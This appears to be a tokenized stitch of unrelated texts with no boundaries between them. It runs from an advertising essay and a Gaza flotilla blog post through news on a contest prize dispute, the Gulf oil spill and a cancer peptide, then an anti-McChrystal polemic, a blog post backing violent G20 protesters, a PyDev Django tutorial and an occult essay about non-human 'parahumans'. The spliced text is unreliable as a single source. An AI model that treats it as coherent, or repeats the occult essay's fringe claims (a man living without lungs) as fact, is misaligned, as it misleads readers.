Unfortunately this is unlikely to change anytime soon unless there is a fundamental shift in how we think about advertising and the web .
In the past , most local businesses relied on print advertising a.k.a. junk mail as a cost effective means of promoting their products or services .
Mailing out letters , post cards , and flyers was considered to be the norm .
While most businesses considered the standard 1 % – 2 % response rate a successful campaign , most people would never even bother to open or read these promotions .
Today the same can be said about online advertising .
Most web users have learned to ignore ads unless they are in purchase mode searching for a particular good or service .
Grabbing the consumer ’s attention has always been a challenge .
So what can we do differently to grab their attention ?
We can pay them !
Money is a motivator .
Transferring the money from advertisers directly to the consumer ’s pockets may sound far fetched to you , but this is our only hope of effectively monetizing the majority of web services out there including digital media .
How ?
Let me explain .
Charging users for web services has failed for the majority of businesses .
Why ?
Users have been conditioned to think the web is free and Google has conditioned web site owners to think web services are suppose to be free .
Print media was never free so why should digital media be free ?
Sure it ’s much cheaper to produce digital media but does that justify giving it away for free .
How do we change those perceptions ?
Give web users the advertising money and charge web users some of that money for access to your web service .
It ’s that simple and surely justifiable .
This would allow advertisers to bypass the gatekeepers and directly pay consumers money for their time and attention .
Making this happen wo n’t be easy , but it ’s our only hope for a truly “ free ” and “ open ” web .
When Islamic extremists perpetrate their violent terrorists acts against unarmed civilians , one of the first things I hear is “ Why do n’t Muslims stand up and condemn this action . ”
Many , many do , but that does n’t make for good TV , so the general public rarely hears about it ( more on this in a future post ) .
I condemn violent acts against unarmed civilians , regardless of who is perpetrating them .
That is why I stand up and wholeheartedly condemn last night ’s attack by Israeli forces on humanitarian aid ships bound to Gaza .
Reports are just starting to roll in , but current reports put the death toll at 16 with over 30 more injured .
For those who are unaware of the situation .
A few days ago 6 ships carrying 800 people , from 50 countries , including humanitarians , European legislators , a Nobel Peace Prize laureate , and an elderly Holocaust survivor , left port in Cyprus on the way to Gaza .
The ships are reportedly carrying 10 tons of aid supplies including medical supplies , electric wheelchairs , prefabricated homes and water purifiers .
20 Charities and NGO ’s united under the Free Gaza movement organized the flotilla , the 10th of its kind .
Of the previous attempts about half were allowed to pass through .
But this trip would be different .
With the other ships falling back to enter later , the lead ship , the Freedom Flotilla , was stormed by Israeli commandos about 65 km off the Gaza shore , reportedly while still in international waters .
Current reports indicate 16 activists killed and around 30 injured .
Israeli Defense officials report once the commandos boarded the ship they were attacked with rocks and knives and some protesters attempted to take weapons from the commandos , giving them no choice but to fire on the activists .
People attempting to use rocks and knives in self defense against commandos with automatic weapons , regardless of the reason for boarding , such a disparity should not result in the death of 16 activists .
These are the initial reports , from Israeli , Middle Eastern , and International sources , as well as some of those on board .
I ’m sure in the chaos of an attack initial reports are fuzzy and will be clearer in the coming hours and days , so give me a little sack if new conflicting information comes in .
But as it stands , this is an act that is worthy of condemnation .
The unnecessary loss of life is tragic .
Update :
I have revised the title , removing the words unarmed , given the fact that the activists did use rocks , sticks , knives and a pistol taken from a soldier .
Although technically armed , I see these actions as self defense and not justification for the use of force by Israeli soldiers .
The pistol being the most dangerous weapon appears to not have been on the ship before the raid , therefor before guns were introduced to the situation , the boat was only “ armed ” with rocks , sticks , and knives .
Update # 2 :
This article was written within about 2 hours of the initial event and was consistent with the known facts at the time , but since then new information has come to light .
A good summary of what is now known can be found on Shane ’s entry .
It appears that the world was duped to some extent .
At least one of the ships , the Mavi Marmara , did contain people who acted aggressively , and that is the ship that contained the casualties .
The soldiers were attacked and acted in self defense .
Although it could also be said that those individuals on the ship were acting in self defense as well , considering they were traveling in international waters , at night , when suddenly a helicopter shows up and what appear to be armed men repelling down .
I ’m still not convinced that Israel has the right to board ships in international waters .
This “ law ” has been cited often from people on both sides of the issue .
I would say that although Israel is in an armed conflict with those within their border , they are not in a declared war with Turkey , whose flag the boats were sailed under .
But considering they would have the right to board once the ships were within Israeli water , where the ships were heading , it is really a technicality .
As I said in the original article , “ I ’m sure in the chaos of an attack initial reports are fuzzy and will be clearer in the coming hours and days , so give me a little sack if new conflicting information comes in .
But as it stands , this is an act that is worthy of condemnation . ”
Given the new information , it is not a clear case of one side or the other being completely wrong and worthy of condemnation .
It appears each share some blame in the situation , it is an unfortunate situation and even more unfortunate that live were lost .
Editor ’s Note : Some article links for background .
Kim Adamski almost threw the letter away .
In late summer 2008 , she and her husband , Jay , the owners of Adamski Construction in McDonald , Washington County , entered Excel Homes ' " Is It Modular " contest on a whim .
Jay Adamski , a builder for more than 30 years , was always looking for a new opportunity , his wife said .
When she found the contest advertised in a home magazine , they spent a few minutes on the contest website answering questions .
Picking through a stack of mail weeks later , she dropped some of it into the trash .
The letter , taped in the back , drew her attention .
She fished it out and opened it , she said .
As the randomly selected winner of Excel 's grand prize , it read , Jay Adamski 's company would receive a $ 100,000 cash allowance to use on prefabricated home products for a project of his choice .
The Adamskis , who 've spent about $ 25,000 on the project , are ready to start their triplex in Cecil Township .
But last week , the couple received a letter from Jay Kedia , the company 's vice president of business development .
On May 3 , Camp Hill - based Excel was acquired by H.I.G. Capital , a private investment firm , the letter said .
Obligations held by the former company , Excel Homes LLC , would not be honored by the new company , Excel Homes Group LLC .
" I do n't understand it , " Jay Adamski said .
" How can they get out of [ honoring an obligation ] by adding the word ' group ' to their name and have that be OK ? "
Several calls to Kedia and Samuel Stahl , the Michigan lawyer handling obligations for the former company , were not returned Friday .
Two news releases lauding the couple 's grand prize win remained on the company 's website Friday .
Kim Adamski said she 's contacted the Pennsylvania attorney general 's office and is in the process of filling out a complaint form .
Nils Frederiksen , a spokesman for the office , said that while the attorney general typically receives a few hundred complaints about contests and promotions each year , it is rare for someone to complain about not receiving the grand prize .
" Until we review the facts , we can't make a judgment , " Frederiksen said .
" However , in some situations , the best recourse might be private legal action . "
The Adamskis said they are mulling their options .
They said it would be nice to at least get back the money they paid in building permit fees , about $ 1,000 , and sewer and water line tap - in fees , about $ 23,000 .
After the couple signed documentation and toured Excel 's Liverpool facility in February 2009 , they spent the spring mulling project options and looking at blueprints , Kim Adamski said .
By fall , they 'd decided on the triplex and moved forward with securing all the needed permits .
They decided to wait through what turned out to be one of the worst winters in memory before beginning the project .
When spring arrived , they demolished a storage shed business they 'd run at the edge of their property to make way for the town houses .
As recently as a few weeks ago , the couple said they were in contact with representatives from the company about finishing touches for the town houses .
Jay Adamski said there was a hold - up with the permits because new regulations about in - home sprinkler systems were about to become law and the township had to figure out if his project would need them .
Finally , on April 28 , Kim Adamski said she cut a $ 10,000 check that was to guarantee delivery of all of the construction components .
" I had the date , May 10 , circled on my calendar and wrote , ' Apartments arrive , ' " she said .
At no time , the couple said , were they told they were in danger of losing the prize or violating any of the terms or conditions set out by Excel .
When they got the letter , they put a stop payment order on the check , she said .
With summer coming , Jay Adamski said he might construct the triplex anyway , using traditional construction methods .
He 's already invested the money , he said .
" Is n't that ironic , " Kim Adamski said .
" That was the whole point of the promotion , to get [ traditional ] builders to see how great modular homes are . "
There was mounting evidence last night that the scale of the oil spill disaster in the Gulf of Mexico has grown beyond all the initial worst - case scenarios , as thousands of gallons of oil continued to gush from the sea floor .
On the island of Key West , south of Florida , coastguard officials said about three tar balls an hour were washing up on the beaches of a state park .
They said the globs of concentrated oil suggest leaking crude has now become caught up in the powerful loop current and could move from the gulf up to the Atlantic coast .
Meanwhile , an oceanographic research ship reported sighting a 10 km ( six - mile ) plume lurking at depths below 1,000 metres and invisible from the surface .
The evidence of spreading environmental damage grew even more compelling with the release of fresh video showing thick clouds of oil billowing from the ruptured well .
The Obama administration responded by doubling the no-fishing zone to 19 % of the waters in the gulf .
Fighting the spill is risky .
Lisa Jackson , head of the Environmental Protection Agency , acknowledged that authorities were relying heavily on Corexit , a chemical banned in the UK because of its effects on limpets and other sea life .
" There has been a real reliance on them , maybe more than anybody thought would ever happen , " she told the Senate environment and public works committee .
The mounting evidence forced administration officials to admit for the first time yesterday that they had underestimated the risks of offshore drilling .
In two highly charged hearings in the Senate , Ken Salazar , the interior secretary , conceded there had been failures in oversight by the agency responsible for policing offshore drilling .
" We need to clean up that house , " he said .
The Minerals Management Service ( MMS ) , the regulatory body for offshore drilling , was notorious in the George Bush era for sex - and - cocaine fuelled parties in Colorado .
Salazar , under heated questioning from some senators , was forced to concede that the agency had not been entirely cleansed in the 15 months under his charge .
" We need to have the right regulatory regime in place and we will work hard to make sure that happens , " he said .
He admitted that the disaster had been a " wake - up call " and had persuaded him that policing of safety and environmental regulations on offshore oil rigs may have been inadequate .
" My initial read on that is there should be additional safety requirements , " he told the committee .
Salazar also conceded there were " a few bad apples " among the inspectors of the MMS , and promised that if they over - ruled environmental advice from other government agencies – as was alleged by some senators – they would be punished .
" If there is someone in the department who ignored the science , then heads will roll , " he said .
But Nancy Sutley , the chair of the White House council on environmental quality , told a Senate hearing later yesterday she had raised concern in February about a widespread policy of waiving environmental reviews for offshore drilling .
Salazar was also adamant that the administration had been right to seek an expansion of offshore drilling last March , and made it clear there would be no revisiting that decision .
The White House this week intensified its efforts to limit the potential political damage on November 's mid-term elections by backing an independent commission to investigate the disaster .
In testimony yesterday defensive actions also included dogged resistance by administration officials to senators ' demands to provide estimates of the size of the spill .
The stonewalling went beyond the Senate hearings .
For the past 48 hours , officials have resisted reports by scientists that the spill could have entered the loop current , or downplayed their significance .
" By the time the oil is in the loop current , it 's likely to be very , very diluted .
And so it 's not likely to have a very significant impact .
It sounds scarier than it is , " said Jane Lubchenco , the head of the National Oceanic and Atmospheric Agency .
Researchers have shown that a peptide ( a chain of amino acids ) called iRGD helps co-administered drugs penetrate deeply into tumor tissue .
The peptide has been shown to substantially increase treatment efficacy against human breast , prostate and pancreatic cancers in mice , achieving the same therapeutic effect as a normal dose with one - third as much of the drug .
In a transformative paper published in the online edition of the journal Science , Erkki Ruoslahti , M.D. , Ph.D. , distinguished professor at Sanford - Burnham Medical Research Institute and founding member of the UC Santa Barbara - Sanford |Burnham Center for Nanomedicine , Kazuki N. Sugahara , M.D. , Ph.D. , Tambet Teesalu , Ph.D. , and fellow researchers at the Center for Nanomedicine and the Cancer Center of Santa Barbara , announced this significant advance in cancer therapy .
" Drugs generally have difficulty penetrating tumors beyond a few cell diameters from a blood vessel , " said Dr. Ruoslahti .
" This leaves some tumor cells with a suboptimal dose , increasing the risk of both recurrence and drug resistance .
The iRGD peptide solves this problem by activating a transport system in tumors that distributes co-injected drugs into the entire tumor and increases drug accumulation in the tumor . "
Dr. Ruoslahti showed in the 1980s that a 3 amino - acid peptide motif ( RGD -- Arginine - Glycine - Aspartic Acid ) serves as a highly selective identifier of malignant tissue , binding to unique re-ceptors in the vasculature of cancers .
The RGD peptide 's ability to home to tumors has been used to design new compounds for cancer diagnosis and treatment .
The new variant of RGD ( iRGD -- internalizing RGD ) combines the RGD motif with a tissue penetration element called CendR .
Like the earlier RGD peptides , iRGD homes to tumors , but exposure of the CendR motif when the iRGD is enzymatically cleaved activates a transport system through tumor blood vessel walls into the tumor core .
In a paper published in Cancer Cell late last year , the research team showed that coupling iRGD to anti-cancer drugs allowed them to penetrate deep into tumors , effectively increasing the activity of the drugs .
The research reported in this latest Science paper adds a new and important twist to the story :
The researchers made the unanticipated discovery that anti-cancer drugs do not need to be chemically attached to the iRGD peptide for iRGD to boost their efficacy .
Simply co-administering iRGD with a drug enhances the drug 's anti-cancer properties .
Co-administration could be even more effective at delivering therapeutic agents inside tumors than conjugating the agents with the peptide .
This new paradigm means that iRGD has the potential to enhance the efficacy of already approved drugs without creating new chemical entities , which would complicate the path to approval for clinical use .
In addition to being effective against human breast , prostate and pancreatic cancers grown in mice , iRGD can penetrate other tumor types and could possibly be used to treat most , if not all , solid tumors .
The iRGD peptide was also shown to enhance the therapeutic effects of multiple types of anti-cancer drugs , including a small molecule drug , a monoclonal antibody and two nanoparticle drugs .
Tumors essentially resistant to a particular drug showed good responses when the drug was combined with iRGD , and tumors partially responsive to another drug were eradicated by the combination .
" We are really excited about the potential of iRGD , and I 'd like to thank my colleagues , Kazuki Sugahara and Tambet Teesalu in particular , who made this all happen , " said Dr. Ruoslahti .
" These results with human tumors in mice are very promising , but we still have to demonstrate the value of iRGD in treating cancers in humans . "
The author of this oral history of the zombie apocalypse , Max Brooks , confirms that the film adaptation is still very much alive — or very much undead .

One of the most anticipated book - to - film projects currently in Hollywood development , World War Z has n't been in the news as of late — and that absence might lead zombiphiles to question whether we 'll ever see a movie .
Author Max Brooks seeks to calm those fears , even while admitting that Z is n't a cheap nut to crack .
In an interview with FearNet , Brooks said :
" Paramount just renewed the option for World War Z , for half the time and twice the money , so that might signal interest .
We still got our director , Marc Forster , who 's raring to go .
Were all waiting on Matt Carnahan 's new draft , which should come in a month or so ...
The size of the book , the scope of the book , makes it hard to produce , in that this thing 's gotta be done right or it just can't be done .
You ca n't do a cheap and dirty World War Z .
It 's a world war , and I think that makes studio executives nervous .
I think it limits its options , so that 's running against it . "

COULD zapping testicles with ultrasound provide a cheap , non-invasive alternative to vasectomy ?
It ’s just one of 78 offbeat ideas that won a $ 100,000 grant from the Bill and Melinda Gates Foundation on 10 May .
The aim of the Grand Challenges scheme is to encourage unconventional thinking to improve health in developing countries .
Other ideas to receive funding include carnivorous plants that eat mosquitoes to combat malaria , and using a “ seek and destroy ” laser - based vaccine to fight the disease leishmaniasis .
The idea of using ultrasound as a contraceptive comes from James Tsuruta and Paul Dayton of the University of …

[ in " honor " of the ignominous end of the career of Lt. General Stanley McChrystal , at the hands of Rolling Stone magazine , let ’s take a moment to remember why Lt. Gen.
McChrystal never deserved to be promoted lat year .
He deserved to be indicted .
In the name of Pat Tillman , I fervently hope that the next time McChrystal ’s name is in the news , it ’s to answer for his action ’s after Pat ’s death in a court of law .
Here is a piece I wrote last year to make the case that McChrystal showed a criminal lack of judgment regarding the aftermath of Pat ’s death .
We now see he has shown a similarly criminal – and deadly – lack of judgment with his approach to the " surge " in Aghanistan .
Good riddance . ]
Ad Policy
When NFL player - turned - Army Ranger Pat Tillman died at the hands of US troops in a case of " friendly fire , " the spin machine at the Pentagon went into overdrive .
Rumsfeld and company could n’t have their most high - profile soldier dying in such an inelegant fashion , especially with the release of those pesky photos from Abu Ghraib hitting the airwaves .
So an obscene lie was told to Tillman ’s family , his friends and the American public .
The chickenhawks in charge , whose only exposure to war was watching John Wayne movies , claimed that he died charging a hill and was cut down by the radical Islamic enemies of freedom .
In the weeks preceding his death , Tillman was beginning to question what exactly he was fighting for , telling friends that he believed the war in Iraq was " [ expletive ] illegal . "
He may not have known what he was fighting for , but it ’s now clear what he died for : public relations .
Today , after five years , six investigations and two Congressional hearings , questions still linger about how Tillman died and why it was covered up .
Now the man who greased the chain of command that orchestrated this great deception is prepared to assume total control of US operations in Afghanistan : Lt. Gen. Stanley McChrystal .
It was McChrystal who approved Tillman ’s posthumous Silver Star , a medal given explicitly for combat , even though he later testified that he " suspected " friendly fire .
Yet despite this , both Democrats and Republicans are rushing to heap praise on McChrystal , including Sen. John McCain .
It was McCain who rushed to speak at Tillman ’s funeral and then , when the cover - up became known , pledged to help the Tillman family expose the truth .
McCain later turned his back on the Tillmans when they raised the volume and demanded answers .
As Pat ’s mother , Mary Tillman , said last year , " He definitely eased out of the situation .
He did n’t blatantly say he would n’t help us , it ’s just that it became clear that he kind of drifted away . "
And now the Tillman family , amidst bipartisan praise for Obama ’s new general , must once again raise the inconvenient truth .
Pat ’s father , Pat Tillman Sr. , told the Associated Press , " I do believe that guy participated in a falsified homicide investigation . "
Mary Tillman , who excoriated McChrystal in her book , Boots on the Ground by Dusk : My Tribute to Pat Tillman , said , " It is imperative that Lt. Gen. McChrystal be scrutinized carefully during the Senate hearings . "
Pentagon spokesman Geoff Morrell said in response :
We feel terrible for what the Tillman family went through , but this matter has been investigated thoroughly by the Pentagon , by the Congress , by outside experts , and all of them have come to the same conclusion : that there was no wrongdoing by Gen. McChrystal .
Morrell ’s statement has more spin than a washing machine powered by a V - 8 engine .
McChrystal has never explained why the early reports of Tillman ’s death were covered up , why his clothes and field journal were burned and destroyed on the scene or why Pat ’s brother Kevin , serving alongside him in the Rangers , was lied to on the spot .
Even the cover - up was covered up .
This should be a cause for dismissal–or indictment–not promotion .
What particularly rankles about Obama ’s choice of McChrystal , whose background is in the nefarious and shadowy world of " black ops , " is that his actions in the Tillman cover - up feel emblematic instead of exceptional .
When an anonymous Army interrogator " at great personal risk " blew the whistle to Esquire in August 2006 on an extensive torture enterprise at Camp Nama , he described the then unknown McChrystal as being an overseer who knew the ugly truth .
Torture at Camp Nama included using ice water to induce hypothermia .
It was not a rogue operation unless we consider Generals like McChrystal " rogues . "
As Esquire reported :
Once , somebody brought it up with the colonel .
" Will [ the Red Cross ] ever be allowed in here ? "
And he said absolutely not .
He had this directly from General McChrystal and the Pentagon that there ’s no way that the Red Cross could get in –they wo n’t have access and they never will .
This facility was completely closed off to anybody investigating , even Army investigators .
Later in the piece , when asked where the colonel was getting his orders from the interrogator said , " I believe it was a two - star general .
I believe his name was General McChrystal .
I saw him there a couple of times . "
Clearly President Obama is trying to " own " the war in Afghanistan : upping the troop levels , making it his " central front " in the battle against terrorism and now placing his own general in charge .
But the president is also disappointing a generation of antiwar activists who voted for him expecting an end to imperial adventures and torture sanctioned by the executive branch .
Now a man who should perhaps be on trial at the Hague is in charge of Afghanistan .
Obama needs to know it ’s not just the Tillmans who are enraged by this terrible choice .
This past weekend has seen remarkable protests against the g20 in Toronto , Canada .
The government has reportedly spent an astounding $ 900 million on keeping the world leaders and their meeting safe from the protesters .
Which really , quite simply , points to exactly the problem with the priorities of our system : our system has , since the beginning , been more concerned with self - perpetuation and holding on to power than it is with , say , dealing with the issues of the world .
The media , of course , is trying to split us into “ good protester ” and “ bad protester . ”
The Huffington Post has a posted a shamefully poor AP article ostensibly about how the police have now arrested hundreds of activists who were n’t even in the act of protesting , but it quickly devolves into a ridiculous effort to justify these actions .
I feel like I ’ve read this exact article a hundred times .
Start by talking about how the cops did something sketchy , like raid a university center for mass arrests , but justify their action in the first sentence :
Police raided a university building and rounded up hundreds of protesters Sunday in an effort to quell further violence near the G - 20 global economic summit site a day after black - clad youths rampaged through the city , smashing windows and torching police cars .
next move on to quoting the government :
Prime Minister Stephen Harper deplored the actions of a “ few thugs ” and suggested the violence justified the controversial cost .
“ I think it goes a long way to explaining why we have the kind of security costs around these summits that we do , ” he said .
( note that this quote also serves the purpose of somehow justifying the $ 900 million spent defending the summit )
Follow this by finding a protest group willing to try to make a plea for “ legitimacy ” by embracing their purported enemies ( the summit itself ) who will never , ever give a shit about them , and turning against their would - be allies :
An anti-poverty group called The Global Call to Action Against Poverty criticized the protesters who committed violence .
“ A bunch of pimply faced teenagers trashing shops and burning cars does not help anyone , ” said Rajesh Latchman of GCAP South Africa .
“ These hooligans obscure the real issues . ”
and finally , put it in historical context by justifying police brutality of the past :
Previous global summit protests have turned violent .
In 1999 , 50,000 protesters shut down World Trade Organization sessions in Seattle as police fired tear gas and rubber bullets .
There were some 600 arrests and $ 3 million in property damage .
One man died after clashes with police at a G - 20 meeting held in London in April 2009 .
First of all … $ 3 million in property damage versus $ 900 million in defense expenditure ?
But most important here is that a man “ died after clashes with police ” in london , which is an outright lie .
A man , unrelated to the protests , was killed by the police .
That is n’t a “ clash . ”
A war is when at least two armies are fighting .
Sigh .
My response might be simplest summed up by someone over at Infoshop News :
If you ’re angry about people dressed in black burning cars , you should probably know about the people in suits burning countries .
So , yes , I support the “ black clad hooligans ” in Toronto .
Because they believe , for uncountable reasons , that the unelected world leaders of the g20 are in the direct process of destroying the natural earth , looting the developing world , and generally perpetuating the whole “ rich get rich the poor get dead ” thing .
And no , the protesters are n’t willing to be polite about it .
Think about it .
If you believed that the earth and most everyone in it was being absolutely tormented , tortured , and murdered by some rich people wearing suits , would you go hold a sign somewhere and hope that these bastards look at you and change their minds ?
Or would you go try to stop them ?
The black clad anarchists might alienate some people , but almost no one is inspired by a bunch of spineless people saying “ nurr … the g20 is bad but we should be cute and cuddly towards them . ”
I have no idea if summit protests are useful , but I do know that the people who are out there fighting are incredibly brave , knowing that the most powerful countries in the world are spending nearly a billion dollars to crush dissent .
Knowing that the state has the power to call summit protest organizers terrorists .
And by continuing to be a thorn in the g20 ’s side , no matter how hard it tries to remove us , we can show the world , and show ourselves , that money does n’t have the power to silence us .
That no , a bunch of evil bastards can’t meet in public without hiding behind legions of armored minions .
Auto shows can be tedious affairs to cover at times with rows and rows of cars everywhere the eye can see .

Django
To get started with Django in PyDev , the pre-requisite is that Django is installed in the Python / Jython / IronPython interpreter you want to use ( so , " import django " must properly work – if you 're certain that Django is there and PyDev was n't able to find it during the install process , you must go to the interpreter configuration and reconfigure your interpreter so that PyDev can detect the change you did after adding Django ) .
If you do n't have Django installed , follow the steps from http://www.djangoproject.com/.
Note that this tutorial wo n't teach you Django .
It 'll only show how the Django integration is available in PyDev , so , if you 're not familiar with Django , it 's useful to learn a bit about how it works and then use this help to know how the PyDev Django integration can help you .
A bit on internals
The Django integration in PyDev works through 3 main configurations :
1 . The project must be marked as a Django project inside of PyDev .
2. A DJANGO_MANAGE_LOCATION string substitution variable must point to the project - relative location of manage .py .
3. A DJANGO_SETTINGS_MODULE string substitution variable must contain the name of the settings module in that project .
And that 's it , with those properly configured , all the Django - related actions should work ( provided the project is already configured as a Django project , there 's an UI to configure those settings in the project properties : right - click your project > properties > PyDev - Django )
Creating a new project
Use the new project wizard through Ctrl+N > PyDev Django Project to create a new Django based project .
That wizard will use django - admin.py startproject to create the project and will properly set the string substitution variables used inside of PyDev so that DJANGO_MANAGE_LOCATION points to the created manage .
py location and the DJANGO_SETTINGS_MODULE points to the settings module .
Using the Django integration in an existing project
For an existing project , just right click it and choose ' PyDev > Set as Django project ' .
Note that the DJANGO_MANAGE_LOCATION and DJANGO_SETTINGS_MODULE will not be set at this time , but when executing an action that needs it , PyDev will ask about it .
Django actions
Django actions can be accessed right clicking a project with the Django configuration and choosing Django > action .
Another option is using ( with focus on a PyDev editor ) :
ctrl +2+dj < enter > to open a dialog with the history of entered actions
to open a dialog with the history of entered actions ctrl+2+dj action_to_execute < enter > to already pass the action to be executed ( e.g. : ctrl + 2 + dj help < enter > )
Interactive shell with Django
Note that the Shell with django environment action will create a shell properly configured with your settings , providing the default features from the PyDev shell , such as code completion , history , context assistants ( ctrl+1 ) , making an execfile of the editor , etc ( see : Interactive Console for more details ) .
It can be activated through ctrl+2+dj shell ( if on a PyDev Editor ) or right - clicking the project > Django >
Shell with django environment .
Run /Debug as Django
Run as Django / Debug as Django are available ( note that they set the - - noreload by default ) .
This will create a default Run configuration , so , you may edit it later through run > run configurations ( or debug > debug configurations ) if you want to change a parameter .
Note : to know how to rerun the last launch see : the Rerun Last Launch topic on PyDev Launching
Note 2 : if the -- noreload is not passed , only the parent process will be killed from Eclipse and the others will only be killed when they'd be reloaded ( i.e. : on a code - change ) .
Run /Debug Django with autoreload
It 's possible to run Django using it 's auto - reload feature .
Note : make sure you have PyDev 3.4.1 or or a more recent version for that ( which added multiprocessing debugging by default and kills children processes properly ) .
If you have some issue , make sure that in the preferences > PyDev >
Run /Debug , ' Attach to subprocess automatically while debugging ? ' is checked and ' When terminating process , kill suprocesses too ? ' is also checked .
Also , if you have a launch from a previous version , either go to Run > Run Configurations and remove existing launches ( to recreate them ) or remove the - noreload from the arguments in existing launches .
So , doing that , starting the remote debugger and making a debug run should enable all the regular breakpoints that are put inside Eclipse to work in the Django process and to see changes done without the need for restarting the application .

There is no doubt that television programs and cinematic features have gone a long way in shaping our understanding of the occult , and conversely , many shows have benefited from a thorough knowledge of speculative matters .
A recent example is the series , which offers its viewers the possibility of a “ parallel Earth ” in which the Twin Towers still stand -- and in which the Hindenburg never exploded , or so it seems .
Even more suggestive is the presence of entities that are unmistakably the “ Men in Black ” or MIBs of ufological lore , depicted here as disinterested observers of the events that move the shows plot .
But the creators ofleave their viewers with an unequivocal message : some of the people in our midst , who look like us and sound like us , share our bus and subway rides , may look human , but are not fully so .
Let us explore this notion further .
Would agents of another reality , on a mission to our own , bring their own devices or have to make do with ours ?
Would their senses of vision , sight and hearing be equal to our own , or more or less acute ?
And if they brought devices from their own reality , would they risk losing them to the authorities of our law enforcement agencies , or would these simply not function once whatever hypothetical barrier had been crossed ?
Aside from having to develop a taste for our fast food , our hypothetical interdimensionals may have other issues on their hands .
Communications between their numbers might be achieved by rustic , old - fashioned methods such as the ones suggested here .
In the fall of 1985 , the Washington , D.C. City Paper featured a small ad in its " Personals " column which read : Readers of this section of the free paper state that the bulk of the messages in the personals are communications between members of the gay community , drug dealers , illegal immigrants , etc. dealers .
The aforementioned ad , however , hailed the attention of anyone able to recognize the initials for the Ordo Templo Orientalis and Argentinium Astrum - - occult lodges of the early 20th century , which might perhaps be experiencing a rebirth toward the latter decades of the same century .
On the subject of these hidden messages in our cities ' newspapers and journals , Jacques Bergier , the prolific French author and scientist , commented : " I 've often wondered if certain strange classified ads in the newspapers are in fact messages between superintelligent beings . "
Bergier , coauthor of , dedicated a great deal of study to the problem of cryptology as a branch of paranormal research , and he also believed that even more detailed secret messages could be conveyed under the guise of specialized works , novels or even philosophical tracts .
Bergier was n’t alone in this .
As far back as 1958 , according to French author Patrice Gaston , no less prestigious a source than thepublished a study on a series of disconcerting messages found in the paper ’s classified section .
The messages were apparently subjected to the scrutiny of several cryptographers , and despite their best efforts , were ultimately unsuccessful .
The concern was understandable , as these messages were appearing during the chilliest moments of the Cold War .
If the existence of enigmatic , ciphered messages were confined to the newspapers , it would be possible to dismiss them as merely the pranks of a particular group of people , drug runners , or those soliciting companionship .
The riddle posed by occult messages goes far beyond foolscap and into stone carvings on European monasteries , carefully etched metal tablets given to the founders of religions and the cuneiform - like messages given to the contactees of our UFO age by the denizens of other dimensions or worlds .
Would non-humans – interdimensional agents , superintelligent beings or simply human secret societies – avail themselves of such concealed messages to contact each other ?
It has been suggested elsewhere that the ever - present crop circles are intelligent messages , not necessarily aimed to humankind as a whole but to specific , mysterious groups .
Others have discussed strange television commercials or interruptions in TV broadcasts that show a specific image for fleeting seconds – long enough to make an impression on the viewers brain before returning to normal programming .
Some of these images include cartoons , odd symbols or text , or nonsense words .
Simple gaffes of the television industry , or calls to action to a specific group of individuals ?
Oddly enough , the “ Fringe ” series referenced earlier features some enigmatic and out - of - place images in its breaks that hint at this .
Perhaps it is a nod to Philip K . Dick ’s novel , in which the author states : “ in 1974 a cipher was sent out as a signal that the Age of Iron was over ; the cipher consisted of two words : KING FELIX , which refers to the Happy or ( Rightful ) King .
The two - word cipher signal KING FELIX was not intended for human beings but for the descendants of Ikhnaton , the three - eyed race which , in secret , exists with us .
” Patrice Gaston , mentioned a few paragraphs ago , also delved into the nature of mysterious television signals and suspicious TV programs .
He concluded his study on the matter thus : “ Television is a strange means of communication .
So strange that one might as well wonder if human activities are being received and studied by unseen entities in order to keep abreast of developments .
” There is a case involving parahumans ( or cryptoterrestrials , to borrow the term coined by the late Mac Tonnies ) that has always resonated with me over the years .
It comes from the endless casebooks of Spanish paranormalist Salvador Freixedo and is deliberately vague when it comes to details .
He simply refers to it as the “ Lula ” case and it is featured in his 1989 book ( the Human Farm ) .
During his years in Venezuela , Freixedo made the acquaintance of a woman named Lula , a society hostess who had left her husband to marry a parahuman , if not outright supernatural , individual named Jorge .
Upon the latter 's untimely death ; a medical exam revealed that the man had lived without lungs !
Jorge 's uncanny talents and his jokes of coming from " another world " were no longer a laughing matter .
An autopsy was forbidden at the time , but the enigmatic personage was known to hundreds of witnesses .
When Freixedo returned to Venezuela in later years to attend the exhumation of the body , he learned that Lula had disappeared off the face of the earth .
The story is much more involved than this brief synopsis suggests , and goes into the physical feats that “ Jorge ” the parahuman was capable of : tremendous endurance as he ran the length of the beach at Barqiusimeto for hours and hours back and forth at high speed , to the astonishment of the crowd ; his eerie sixth - sense , and what is perhaps the only physical proof of all these claims : a small crystal jar that he kept with him at all times , and seemed to aid his labored breathing .
When Jorge died , the jar shattered of its own volition .
This case is clearly anecdotal .
We neither have the x-rays that startled the Venezuelan technicians , nor Lula at hand to be questioned .
Despite “ Jorge ’s ” good natured remarks about his otherworldly provenance , there was no suggestion that he was extraterrestrial – he was perfectly at home in his reality , was a successful businessman , did n’t shy away from contact with others .
Yet his entire existence suggests that he was among us , yet not one of us .
On the other hand , he did not belong to the same order of beings as the Men In Black – the socially inept characters described by the late John A. Keel in .
Freixedo’s “ Jorge ” , on the other hand , was adroit and very engaging .
Did he belong to a parahuman / cryptoterrestrial / ultraterrestrial group that has moved among us for centuries , keeping in touch with one another through a variety of means ?
Back to the enigmatic signs :
The infamous Voynich Manuscript constitutes a perfect example of such encoded documents that are meant to be understood by exactly the right person or persons , to the chagrin of cryptologists and those bent on unlocking its secrets .
Allegedly , it was originally the property of Roger Bacon , the medieval Franciscan friar , and found its way into the hands of many Renaissance occultists , such as the infamous Dr. John Dee .
The Vatican eventually acquired the manuscript , and some of its best minds attempted to crack the illustrated manuscript 's coded mysteries .
Some eighty years ago , an American antiquarian , Wilfrid Voynich , purchased the bizarre text which now bears his name and circulated it among the most learned minds of the time : some believed that its illustrations depicted the flora of another world ; others hinted at charts of the constellations as they appeared thousands -- or millions -- of years ago .
After World War 2 , a scholar claimed to have deciphered part of the manuscript and obtained the instructions for a viable contraceptive method .
The Voynich Manuscript could well be the factual basis for H.P. Lovecraft 's accursed grimoire , the Necronomicon .
Professor Juan Rocha de Azevedo , author of , relates the tale of Eugéne Canseliet , who belonged to the circle of adepts surrounding the shadowy figure of the " alchemist " Fulcanelli in the 1920's .
At the time , members of the inner circle boasted that their master was on the brink of cracking the Philosopher 's Stone .
But as decades passed , Canseliet stated that Fulcanelli had long since disappeared -- although he claimed to have visited him in Seville , Spain , in the 1950's , and that Fulcanelli had undergone extensive physical changes as a result of having ingested the Elixir of Life .
Azevedo states that the nature of these changes was an overall androgynous appearance .
